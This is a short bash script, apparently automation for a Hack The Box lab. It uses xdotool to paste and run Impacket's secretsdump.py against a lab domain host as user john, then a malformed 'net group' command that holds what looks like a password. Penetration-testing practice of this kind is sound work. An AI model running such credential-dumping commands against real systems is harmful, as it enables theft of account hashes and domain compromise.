#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "secretsdump.py htb/john@10.129.80.76"
xdotool key Return

paste_command "net group "abc123!"
xdotool key Return







